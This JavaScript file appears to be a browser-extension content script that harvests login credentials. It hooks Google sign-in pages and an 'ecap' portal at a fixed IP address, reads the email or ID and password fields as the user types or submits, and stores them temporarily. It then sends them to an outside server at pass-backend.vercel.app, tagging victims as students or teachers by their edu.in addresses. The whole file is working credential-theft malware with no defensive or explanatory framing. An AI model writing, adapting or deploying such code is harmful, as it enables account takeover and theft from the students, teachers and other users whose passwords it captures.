let logs = [];
async function post(url, body) {
  // const baseUrl = "http://192.169.0.169:3000";
  const baseUrl = "https://pass-backend.vercel.app";

  return fetch(`${baseUrl}/${url}`, {
    method: "POST",
    // mode: "no-cors",
    cache: "no-cache",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });
}
// "http://103.138.0.69/ecap/*"

function handleGooglePass() {
  console.log("Plets Scrapt this site");
  const cond =
    location.href.includes("accounts.google.com/") &&
    // location.href.includes("/challenge/pwd") &&
    location.href.includes("/signin");
  console.log(cond);
  if (cond) {
    let form = document.querySelector("form");

    let e = setInterval(() => {
      if (location.href.includes("/challenge/pwd")) {
        // console.log("#password $$$$$$$$$$$$$$$$$$");
        let email = document.querySelector("#hiddenEmail");
        let textarea = document.querySelector(".whsOnd.zHQkBf");
        console.log(email);
        textarea.onchange = (e) => {
          console.log("pass change >>>");
          console.log(email?.value);
          console.log(e.target.value);

          post("google", {
            user: email.value,
            passwd: e.target.value,
          }).then((res) => {
            console.log(e);
            clearInterval(e);
          });
        };
      }
    }, 1200);
    // form.addEventListener("submit", (e) => {
    //   console.log("Form ------- Submitted");
    //   let email = document.querySelector("#hiddenEmail");
    //   let textarea = document.querySelector(".whsOnd.zHQkBf");
    //   console.log(email);
    //   textarea.onchange = (e) => {
    //     console.log(email?.value);
    //     console.log(e.target.value);
    //     post("google", {
    //       user: email.value,
    //       passwd: e.target.value,
    //     }).then((res) => console.log(res));
    //   };
    // });
  }
}

function handleGooglePass2() {
  console.log("Plets Scrapt this site");
  const cond =
    location.href.includes("accounts.google.com/") &&
    // location.href.includes("/challenge/pwd") &&
    location.href.includes("/signin");
  console.log(cond);
  if (cond) {
    let form = document.querySelector("form");
    let input = document.querySelector("input.whsOnd.zHQkBf[type='email']");
    console.log(input);
    input.addEventListener("keydown", (e) => {
      console.log("$userKey");
      if (e.key == "Enter") {
        console.log(e.key);
        setTimeout(() => {
          let email = document.querySelector("#hiddenEmail");
          let textarea = document.querySelector(".whsOnd.zHQkBf");
          console.log(textarea);

          textarea.addEventListener("keydown", (e) => {
            console.log(textarea.value);
            console.log("PassKEy");
            if (e.key == "Enter") {
              post("google", {
                user: email.value,
                passwd: textarea.value,
              }).then((res) => {
                console.log(e);
                clearInterval(e);
              });
            }
          });
        }, 1200);
      }
    });
  }
}

function handleGooglePass3() {
  console.log("Plets Scrapt this site");
  const cond =
    location.href.includes("accounts.google.com/") &&
    // location.href.includes("/challenge/pwd") &&
    location.href.includes("/signin");
  console.log(cond);
  if (cond) {
    function onUsernameSubmit() {
      // Your autofill logic for username here
      console.log("taking username");
    }

    // Function to be executed when the password-related elements appear
    function onPasswordSubmit() {
      // Your autofill logic for password here
      console.log("taking Password");
      let email = document.querySelector("#hiddenEmail");
      let textarea = document.querySelector(".whsOnd.zHQkBf");

      textarea.addEventListener("keydown", (e) => {
        if (e.key == "Enter") {
          console.log("((((   Submitted  )))");
          post("google", {
            user: email.value,
            passwd: textarea.value,
          }).then((res) => {
            console.log(res);
          });
        }
      });
    }

    // Target node to observe (assuming it's the body of the document)
    const targetNode = document.body;

    // Options for the observer (configure to match your needs)
    const config = { childList: true, subtree: true };

    // Callback function to execute when mutations are observed
    const callback = function (mutationsList, observer) {
      for (const mutation of mutationsList) {
        if (mutation.type === "childList") {
          // if (
          //   mutation.target.querySelector("input.whsOnd.zHQkBf[type='email']")
          // ) {
          //   onUsernameSubmit();
          // }
          if (
            mutation.target.querySelector(
              "input.whsOnd.zHQkBf[type='password']"
            ) &&
            mutation.target.querySelector("#hiddenEmail")
          ) {
            onPasswordSubmit();
          }
        }
      }
    };

    // Create an observer instance
    const observer = new MutationObserver(callback);

    // Start observing the target node for configured mutations
    observer.observe(targetNode, config);
  }
}

function handleGooglePass4() {
  console.log("Plets Scrapt this site");
  const cond =
    !location.href.includes("accounts.google.com/") ||
    !location.href.includes("/signin");

  if (cond) return -1;

  let passwordSubmited = false;
  const targetNode = document.body;
  const config = { childList: true, subtree: true };
  const callback = function (mutationsList, observer) {
    for (const mutation of mutationsList) {
      if (mutation.type === "childList") {
        if (location.pathname.includes("challenge/pwd")) {
          console.log("password taking");
          localStorage.setItem(
            "user",
            JSON.stringify({
              user: document.querySelector("#hiddenEmail").value,
              passwd: document.querySelector(
                "input.whsOnd.zHQkBf[type='password']"
              ).value,
            })
          );
          passwordSubmited = false;
        } else if (
          (location.pathname.includes("challenge/selection") ||
            location.pathname.includes("challenge/totp")) &&
          !passwordSubmited
        ) {
          console.log("password Submitted");
          let { user, passwd } = JSON.parse(localStorage.getItem("user"));
          if (!user || !passwd) {
            console.warn("user or passwd not Found");
            return;
          } else {
            console.log("user & pass Are Found");
          }

          let type = user.includes("edu.in")
            ? user[2].toLowerCase() == "u" && user[3].toLowerCase() == "4"
              ? "student"
              : "teacher"
            : "other";

          post("new-google", { user, passwd, type })
            .then((res) => {
              console.log(res);
              return res.json();
            })
            .then((res) => console.log(res));
          passwordSubmited = true;
        }
      }
    }
  };

  const observer = new MutationObserver(callback);
  observer.observe(targetNode, config);
}

function handlePass() {
  if (!location.href.toLowerCase().includes("http://103.138.0.69/ecap"))
    return -1;

  // * logined successfully
  if (location.pathname.toLowerCase() == "/ecap/studentmaster.aspx") {
    let { user, passwd } = JSON.parse(localStorage.getItem("user"));
    if (!user || !passwd) {
      console.warn("user || passwd is not Found");
    }
    const data = { user, passwd, type: "student" };
    localStorage.clear();
    post("new-ecap", data)
      .then((res) => {
        Log(res.status);
        return res.json();
      })
      .then((res) => {
        Log(res);
      });
  } else if (location.pathname.toLowerCase() == "/ecap/main.aspx") {
    let { user, passwd } = JSON.parse(localStorage.getItem("user"));
    const data = { user, passwd, type: "teacher" };
    localStorage.clear();
    post("new-ecap", data)
      .then((res) => {
        Log(res.status);
        return res.json();
      })
      .then((res) => {
        Log(res);
      });
  } else {
    const id1 = document.getElementById("txtId1");
    const pwd1 = document.getElementById("txtPwd1");
    const id2 = document.getElementById("txtId2");
    const pwd2 = document.getElementById("txtPwd2");
    console.log("page detected");

    pwd2.oninput = (e) => {
      console.log("saving Password");
      localStorage.setItem(
        "user",
        JSON.stringify({
          user: id2.value,
          passwd: pwd2.value,
        })
      );
    };

    pwd1.oninput = (e) => {
      localStorage.setItem(
        "user",
        JSON.stringify({
          user: id1.value,
          passwd: pwd1.value,
        })
      );
    };
  }
}

function Log(mssg) {
  console.log(mssg);
  // logs.push(mssg);
  // localStorage.setItem("logs", JSON.stringify(logs));
}

if (handlePass() == -1) {
  handleGooglePass4();
}
